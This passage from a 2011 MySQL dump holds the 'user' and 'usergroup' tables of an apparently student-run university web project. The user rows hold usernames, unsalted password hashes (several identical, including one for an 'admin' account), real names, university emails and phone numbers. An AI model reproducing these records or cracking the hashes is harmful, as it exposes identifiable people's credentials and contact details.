  `contact` varchar(15) NOT NULL,
  `major` varchar(25) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=47 DEFAULT CHARSET=latin1;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `user`
--

LOCK TABLES `user` WRITE;
/*!40000 ALTER TABLE `user` DISABLE KEYS */;
INSERT INTO `user` VALUES (0,'cblair','a7c9ad6196294713c3c1b77ea02d31a893622c20','Colby Blair','In a bottle.','colby.png','cblair@vandals.uidah','(208) 301-0061','Computer Science'),(11,'anilson','c6922b6ba9e0939583f973bc1682493351ad4fe8','Alex Nilson','CS 384 student','','alexnilson@vandals','208-301-0856','Computer Science'),(13,'sbeddall','697fa0dcb7c5da90b4984f0b8ca6c4bd8b52d51f','','','soon.png','','',''),(15,'brett','ba32d6e55febca1d48bf0a6a82587f6f56bdf6b3','Brett Hitchcock','On fire.','khaaan.png','here@there.comdfdf','123','CS'),(17,'timb','eb09ca756dfbbbfb1fa50970e9549991fbffcefd','','','','','',''),(18,'claurino','df0a2565817c6194cd5c1176bb324ed0b8e284b6','','','','','',''),(20,'crempel','a7c9ad6196294713c3c1b77ea02d31a893622c20','','','','','',''),(21,'abhay','3bd010e4268f9786644c365f32e3e343becbb710','','','','','',''),(22,'drj','a7c9ad6196294713c3c1b77ea02d31a893622c20','','','','','',''),(24,'admin','d8e217ded5272fe8f299468e47a0800cde0d5cc3','','','','','',''),(37,'sand9300','92429d82a41e930486c6de5ebda9602d55c39986','','','','sand9300@vandals.uidaho.edu','',''),(38,'pythonspy','d8389a40cdfa1a43a9ed250cf791adbe721d273c','','','','pythonspy@vandals.uidaho.edu','',''),(42,'cbabraham','dd2edb87ea9eb7a32fd4057276d3a1fab861c1d5','','','','cbabraham@uidaho.edu','',''),(45,'long3841','1e07b932de079b26503ac3d8bc85e8e2910080e0','','','','long3841@uidaho.edu','',''),(46,'jeffery','c0b137fe2d792459f26ff763cce44574a5b5ab03','','','','jeffery@uidaho.edu','','');
/*!40000 ALTER TABLE `user` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `usergroup`
--

DROP TABLE IF EXISTS `usergroup`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `usergroup` (
  `uid` int(11) NOT NULL,
  `gid` int(11) NOT NULL,
  `perm` tinyint(4) NOT NULL,
  KEY `uid` (`uid`),
  KEY `gid` (`gid`),
  CONSTRAINT `usergroup_ibfk_1` FOREIGN KEY (`uid`) REFERENCES `user` (`id`) ON DELETE CASCADE,
  CONSTRAINT `usergroup_ibfk_2` FOREIGN KEY (`gid`) REFERENCES `ggroup` (`id`) ON DELETE CASCADE
) ENGINE=InnoDB DEFAULT CHARSET=latin1;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `usergroup`
--

LOCK TABLES `usergroup` WRITE;
/*!40000 ALTER TABLE `usergroup` DISABLE KEYS */;
INSERT INTO `usergroup` VALUES (24,10,7),(21,10,0),(21,5,0),(15,10,7),(15,5,7),(13,5,7),(13,10,7),(0,5,7),(0,10,7),(0,11,7),(15,11,7),(13,11,7),(11,5,7),(11,10,7),(11,11,7),(45,5,0),(45,10,7),(45,11,7);
/*!40000 ALTER TABLE `usergroup` ENABLE KEYS */;
UNLOCK TABLES;
/*!40103 SET TIME_ZONE=@OLD_TIME_ZONE */;

/*!40101 SET SQL_MODE=@OLD_SQL_MODE */;
/*!40014 SET FOREIGN_KEY_CHECKS=@OLD_FOREIGN_KEY_CHECKS */;
/*!40014 SET UNIQUE_CHECKS=@OLD_UNIQUE_CHECKS */;
/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
/*!40111 SET SQL_NOTES=@OLD_SQL_NOTES */;

-- Dump completed on 2011-04-19 12:01:30
